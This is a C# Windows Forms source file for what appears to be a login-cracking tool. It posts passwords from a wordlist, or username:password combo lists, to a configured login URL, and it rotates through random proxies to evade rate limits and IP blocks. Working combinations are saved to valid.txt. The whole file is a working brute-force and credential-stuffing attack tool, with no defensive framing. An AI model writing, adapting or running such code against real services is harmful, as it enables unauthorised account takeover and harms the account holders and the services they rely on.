using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Http;
using System.Net.Http.Headers;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.StartPanel;
using System.Net;

namespace jth
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private void passwordlistselect_btn_Click(object sender, EventArgs e)
        {
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                string filepath = openFileDialog1.FileName;
                passwordlist_tbox.Text = filepath;
            }
        }

        private void configselect_btn_Click(object sender, EventArgs e)
        {
            if (openFileDialog2.ShowDialog() == DialogResult.OK)
            {
                string filepath = openFileDialog2.FileName;
                config_tbox.Text = filepath;
            }
        }

        private async void attack_btn_Click(object sender, EventArgs e)
        {
            if (checker_radio.Checked == false)
            {
                if (passwordlist_tbox.Text == "")
                {
                    MessageBox.Show("Please Select A Password List");
                    return;
                }
                if (username_tbox.Text == "")
                {
                    MessageBox.Show("Please Enter A Username");
                    return;
                }
                if (config_tbox.Text == "")
                {
                    MessageBox.Show("Please Select A Config");
                    return;
                }
                if (proxylist_tbox.Text == "")
                {
                    MessageBox.Show("Please Select A Proxy List");
                    return;
                }
            }
            else
            {
                if (combo_tbox.Text == "")
                {
                    MessageBox.Show("Please Select A Combo List");
                    return;
                }
                if (config_tbox.Text == "")
                {
                    MessageBox.Show("Please Select A Config");
                    return;
                }
                if (proxylist_tbox.Text == "")
                {
                    MessageBox.Show("Please Select A Proxy List");
                    return;
                }
            }

            IniConfigParser parser = new IniConfigParser(config_tbox.Text);

            string url = parser.GetConfigValue("target", "url");
            int timeout = int.Parse(parser.GetConfigValue("bruteforce", "timeout"));
            int maxAttempts = int.Parse(parser.GetConfigValue("bruteforce", "attempts"));
            int delay = int.Parse(parser.GetConfigValue("bruteforce", "delay"));
            string userheader = parser.GetConfigValue("headers", "userheader");
            string passheader = parser.GetConfigValue("headers", "passheader");

            
            string[] proxies = File.ReadAllLines(proxylist_tbox.Text);
            
            
            if (proxies.Length == 0)
            {
                MessageBox.Show("Proxy list is empty.");
                return;
            }

            Random random = new Random();
            
            if (bruteforce_radio.Checked == true)
            {
                string[] passwords = File.ReadAllLines(passwordlist_tbox.Text);
                foreach (string password in passwords)
                {
                    bool success = false;
                    int attempts = 0;

                    while (!success && attempts < maxAttempts)
                    {
                        try
                        {
                            string proxyAddress = proxies[random.Next(proxies.Length)];

                            var httpClientHandler = new HttpClientHandler
                            {
                                Proxy = new WebProxy(proxyAddress),
                                UseProxy = true
                            };

                            using (HttpClient client = new HttpClient(httpClientHandler))
                            {
                                client.Timeout = TimeSpan.FromSeconds(timeout);

                                var content = new StringContent($"{userheader}={username_tbox.Text}&{passheader}={password}", System.Text.Encoding.UTF8, "application/x-www-form-urlencoded");

                                var response = await client.PostAsync(url, content);

                                if (response.IsSuccessStatusCode)
                                {
                                    results.Text += $"Password Found: {password}\n";
                                    success = true;
                                }
                                else
                                {
                                    results.Text += $"Password Incorrect: {password}\n";
                                }
                            }
                        }
                        catch (TaskCanceledException ex)
                        {
                            results.Text += $"Request timed out: {ex.Message}\n";
                        }
                        catch (Exception ex)
                        {
                            results.Text += $"Error: {ex.Message}\n";
                        }

                        attempts++;
                        if (!success && attempts < maxAttempts)
                        {
                            results.Text += $"Retrying attempt {attempts} for password: {password}\n";

                            await Task.Delay(delay * 1000);
                        }
                    }

                    if (!success)
                    {
                        results.Text += $"Max attempts reached for password: {password}\n";
                    }

                    await Task.Delay(delay * 1000);
                }
            }
            else
            {
                string[] combos = File.ReadAllLines(combo_tbox.Text);
                foreach (var combo in combos)
                {
                    var comboparts = combo.Split(':');
                    if (comboparts.Length != 2)
                    {
                        results.Text += $"Invalid combo format: {combo}\n";
                        continue;
                    }
                    var username = comboparts[0];
                    var password = comboparts[1];
                    bool success = false;
                    int attempts = 0;

                    while (!success && attempts < maxAttempts)
                    {
                        try
                        {
                            string proxyAddress = proxies[random.Next(proxies.Length)];
                            var httpClientHandler = new HttpClientHandler
                            {
                                Proxy = new WebProxy(proxyAddress),
                                UseProxy = true
                            };

                            using (HttpClient client = new HttpClient(httpClientHandler))
                            {
                                client.Timeout = TimeSpan.FromSeconds(timeout);
                                var content = new StringContent($"{userheader}={username}&{passheader}={password}", System.Text.Encoding.UTF8, "application/x-www-form-urlencoded");
                                var response = await client.PostAsync(url, content);

                                if (response.IsSuccessStatusCode)
                                {
                                    results.Text += $"Account Found: {combo}\n";
                                    
                                    using (StreamWriter writer = new StreamWriter("valid.txt", true))
                                    {
                                        await writer.WriteLineAsync(combo);
                                    }
                                    success = true;
                                }
                                else
                                {
                                    results.Text += $"Account Incorrect: {combo}\n";
                                }
                            }
                        }
                        catch (TaskCanceledException ex)
                        {
                            results.Text += $"Request timed out: {ex.Message}\n";
                        }
                        catch (Exception ex)
                        {
                            results.Text += $"Error: {ex.Message}\n";
                        }

                        attempts++;
                        if (!success && attempts < maxAttempts)
                        {
                            results.Text += $"Retrying attempt {attempts} for combo: {combo}\n";
                            await Task.Delay(delay * 1000);
                        }
                    }

                    if (!success)
                    {
                        results.Text += $"Max attempts reached for combo: {combo}\n";
                    }

                    await Task.Delay(delay * 1000);
                }
            }
        }   

        private void checker_radio_CheckedChanged(object sender, EventArgs e)
        {
            if (checker_radio.Checked == true) 
            {
                username_tbox.Enabled = false;
                passwordlistselect_btn.Enabled = false;
                passwordlist_tbox.Enabled = false;
                combo_tbox.Enabled = true;
                combolist_btn.Enabled = true;
            }
            else
            {
                username_tbox.Enabled = true;
                passwordlist_tbox .Enabled = true;
                passwordlistselect_btn.Enabled = true;
                combo_tbox.Enabled = false;
                combolist_btn.Enabled = false;
            }
        }

        private void combolist_btn_Click(object sender, EventArgs e)
        {
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                string filepath = openFileDialog1.FileName;
                combo_tbox.Text = filepath;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                string filepath = openFileDialog1.FileName;
                proxylist_tbox.Text = filepath;
            }
        }
    }
}